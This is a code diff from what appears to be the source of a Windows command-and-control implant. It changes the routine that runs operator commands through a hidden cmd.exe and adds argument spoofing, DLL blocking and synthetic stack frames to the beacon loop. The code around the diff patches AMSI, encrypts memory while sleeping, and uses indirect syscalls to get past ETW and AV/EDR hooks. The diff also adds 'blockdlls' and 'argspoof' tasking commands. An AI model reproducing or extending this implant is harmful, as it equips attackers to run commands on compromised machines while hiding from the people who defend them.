@@ -216,38 +216,38 @@ static int exec_cmd(const char *cmd, char *out_b64, size_t out_b64_len) {
     HANDLE hRead, hWrite;
     if (!CreatePipe(&hRead, &hWrite, &sa, 0)) return -1;
     PROCESS_INFORMATION pi; memset(&pi, 0, sizeof(pi));
+    char cmdline[4096];
+    snprintf(cmdline, sizeof(cmdline), "cmd.exe /c %s", cmd);
+    BOOL created = FALSE;
+
+#if ENABLE_ARG_SPOOF
+    if (g_arg_spoof && !created) {
+        created = create_process_arg_spoof(cmdline, hWrite, hWrite, &pi);
+    }
+#endif
+
+#if ENABLE_BLOCK_DLLS
+    if (g_block_dlls && !created) {
+        created = create_process_block_dlls(cmdline, hWrite, hWrite, &pi);
+    }
+#endif
 
 #if ENABLE_NT_PROCESS && ENABLE_INDIRECT_SYSCALL
-    /*
-     * NT path: NtCreateUserProcess via the indirect syscall engine.
-     * Bypasses CreateProcess Win32 shim, ETW ProcessCreate events,
-     * and AV/EDR hooks on CreateProcessInternalW.
-     */
-    NTSTATUS nt_st = NT_exec_cmdline(cmd, hWrite, hWrite, &pi);
-    if (!NT_SUCCESS(nt_st)) {
-        /* NT path failed -- fall back to Win32 CreateProcessA */
-        STARTUPINFOA si_fb; memset(&si_fb, 0, sizeof(si_fb)); si_fb.cb = sizeof(si_fb);
-        si_fb.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
-        si_fb.hStdOutput = si_fb.hStdError = hWrite; si_fb.wShowWindow = SW_HIDE;
-        char fb_cmd[4096];
-        snprintf(fb_cmd, sizeof(fb_cmd), "cmd.exe /c %s", cmd);
-        if (!CreateProcessA(NULL, fb_cmd, NULL, NULL, TRUE, CREATE_NO_WINDOW,
-                            NULL, NULL, &si_fb, &pi)) {
+    if (!created) {
+        NTSTATUS nt_st = NT_exec_cmdline(cmd, hWrite, hWrite, &pi);
+        if (NT_SUCCESS(nt_st)) created = TRUE;
+    }
+#endif
+
+    if (!created) {
+        STARTUPINFOA si; memset(&si, 0, sizeof(si)); si.cb = sizeof(si);
+        si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
+        si.hStdOutput = si.hStdError = hWrite; si.wShowWindow = SW_HIDE;
+        if (!CreateProcessA(NULL, cmdline, NULL, NULL, TRUE, CREATE_NO_WINDOW,
+                            NULL, NULL, &si, &pi)) {
             CloseHandle(hRead); CloseHandle(hWrite); out_b64[0] = '\0'; return -1;
         }
     }
-#else
-    /* Win32 path (ENABLE_NT_PROCESS=0 or indirect syscall disabled) */
-    STARTUPINFOA si; memset(&si, 0, sizeof(si)); si.cb = sizeof(si);
-    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
-    si.hStdOutput = si.hStdError = hWrite; si.wShowWindow = SW_HIDE;
-    char cmdline[4096];
-    snprintf(cmdline, sizeof(cmdline), "cmd.exe /c %s", cmd);
-    if (!CreateProcessA(NULL, cmdline, NULL, NULL, TRUE, CREATE_NO_WINDOW,
-                        NULL, NULL, &si, &pi)) {
-        CloseHandle(hRead); CloseHandle(hWrite); out_b64[0] = '\0'; return -1;
-    }
-#endif
 
     CloseHandle(hWrite);
     char raw[BUF_SIZE]; DWORD n, total = 0;
@@ -695,6 +695,9 @@ static DWORD WINAPI run_beacon(LPVOID unused) {
 #if ENABLE_AMSI_PATCH
     patch_amsi();
 #endif
+#if ENABLE_SYNTHETIC_FRAMES
+    synth_frames_init();
+#endif
 
     char hostname[64], username[64], internal_ip[64], process_name[MAX_PATH];
     get_hostname(hostname, sizeof(hostname));
@@ -851,6 +854,30 @@ static DWORD WINAPI run_beacon(LPVOID unused) {
                 handle_getprivs(out_b64);
             } else if (strcmp(tasks[t].command, "runas") == 0) {
                 handle_runas(args_decoded, out_b64);
+            } else if (strcmp(tasks[t].command, "blockdlls") == 0) {
+#if ENABLE_BLOCK_DLLS
+                if (args_decoded[0] == '1' || (args_decoded[0] == 'o' && args_decoded[1] == 'n')) {
+                    g_block_dlls = 1;
+                    b64_encode((unsigned char*)"BlockDLLs enabled", 17, out_b64);
+                } else {
+                    g_block_dlls = 0;
+                    b64_encode((unsigned char*)"BlockDLLs disabled", 18, out_b64);
+                }
+#else
+                b64_encode((unsigned char*)"BlockDLLs not compiled in", 25, out_b64);
+#endif
+            } else if (strcmp(tasks[t].command, "argspoof") == 0) {
+#if ENABLE_ARG_SPOOF
+                if (args_decoded[0] == '1' || (args_decoded[0] == 'o' && args_decoded[1] == 'n')) {
+                    g_arg_spoof = 1;
+                    b64_encode((unsigned char*)"Argument spoofing enabled", 25, out_b64);
+                } else {
+                    g_arg_spoof = 0;
+                    b64_encode((unsigned char*)"Argument spoofing disabled", 26, out_b64);
+                }
+#else
+                b64_encode((unsigned char*)"ArgSpoof not compiled in", 24, out_b64);
+#endif
             } else if (strcmp(tasks[t].command, "exit") == 0) {
                 b64_encode((unsigned char*)"Agent exiting", 13, out_b64);
                 should_exit = 1;
@@ -902,9 +929,11 @@ do_sleep:
             }
             if (s < 500) s = 500;
 
+#if ENABLE_SYNTHETIC_FRAMES
+            synth_frames_push();
+#endif
 #if ENABLE_SLEEP_ENCRYPT
             if (g_agent_id[0]) {
-                /* One-time: init heap XOR key after registration */
                 heap_key_init();
                 encrypted_sleep((DWORD)s);
             } else {
@@ -912,6 +941,9 @@ do_sleep:
             }
 #else
             Sleep((DWORD)s);
+#endif
+#if ENABLE_SYNTHETIC_FRAMES
+            synth_frames_pop();
 #endif
         }
     }
